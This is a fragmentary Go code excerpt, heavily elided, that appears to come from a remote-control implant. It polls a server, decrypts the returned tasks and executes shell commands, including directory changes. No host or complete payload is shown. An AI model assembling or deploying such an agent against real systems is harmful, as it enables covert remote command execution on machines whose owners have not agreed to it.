...
func beacon(b Beacon) *Task {
	...
	if err := json.NewDecoder(resp.Body).Decode(&response); err != nil { return nil }

	dec, err := decrypt(response["data"])
	if err != nil { return nil }

	var msg struct { Task *Task `json:"task"` }
	if err := json.Unmarshal(dec, &msg); err != nil { return nil }
...
func executeCommand(cmd string) string {
	if strings.HasPrefix(cmd, "cd ") {
		...
		if err := os.Chdir(newDir); err != nil { return err.Error() }
...
func decrypt(enc string) ([]byte, error) {
	...
	if len(raw) < nonceSize { return nil, io.ErrUnexpectedEOF }
